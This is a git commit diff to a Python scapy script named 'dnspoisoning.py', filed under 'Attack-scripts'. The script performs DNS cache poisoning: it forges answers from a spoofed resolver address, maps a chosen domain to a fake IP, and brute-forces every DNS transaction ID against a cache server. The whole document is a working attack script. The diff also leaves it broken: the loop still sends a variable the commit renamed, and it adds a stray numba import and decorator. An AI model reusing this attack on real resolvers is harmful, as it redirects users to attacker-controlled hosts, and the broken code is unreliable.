f8f97ce2a1cab69d9ac97d6c83290f9b2ef54b4b
AmineRRB <118180774+AmineRrB@users.noreply.github.com>
2024-05-27 16:04:37 +0100

    Update dnspoisoning.py

--- Attack-scripts/dnspoisoning.py
+++ Attack-scripts/dnspoisoning.py
@@ -1,22 +1,25 @@
 from scapy.all import *
+from numba import njit
 
 if len(sys.argv) < 3:
-        print("Usage: attack.py [target domain] [spoofed IP]")
+        print("Usage: dnspoisoning.py [target domain] [fake IP]")
         sys.exit()
 
-hostname = sys.argv[1]
+domain = sys.argv[1]
 fake_ip = sys.argv[2]
-cache_server_ip = "172.16.50.1"
+dns_cache_server_ip = "172.16.50.1"
 
-cache_server_port = 53
+dns_cache_server_port = 53
 
-i = IP(dst=cache_server_ip, src="8.8.4.4")
-u = UDP(dport=cache_server_port, sport=53)
-d = DNS(id=0, qr=1, qd=DNSQR(qname=hostname), qdcount=1, ancount=1, nscount=0, arcount=0, an=(DNSRR(rrname=DNSQR(qname=hostname).qname, type='A', ttl=3600, rdata=fake_ip)))
-response = i / u / d
-request = IP(dst=cache_server_ip) / UDP(dport=53) / DNS(id=500, qr=0, rd=1, qdcount=1, qd=DNSQR(qname=hostname, qtype="A", qclass="IN"))
-send(response, verbose=0)
-send(request, verbose=0)
+i = IP(dst=dns_cache_server_ip, src="8.8.4.4")
+u = UDP(dport=dns_cache_server_port, sport=53)
+d = DNS(id=0, qr=1, qd=DNSQR(qname=domain), qdcount=1, ancount=1, nscount=0, arcount=0, an=(DNSRR(rrname=DNSQR(qname=domain).qname, type='A', ttl=3600, rdata=fake_ip)))
+dns_response = i / u / d
+dns_request = IP(dst=dns_cache_server_ip) / UDP(dport=53) / DNS(id=500, qr=0, rd=1, qdcount=1, qd=DNSQR(qname=domain, qtype="A", qclass="IN"))
+send(dns_response, verbose=0)
+send(dns_request, verbose=0)
+
+#@njit
 for x in range(0, 65535):
-    response[DNS].id = x
+    dns_response[DNS].id = x
     send(response, verbose=0)
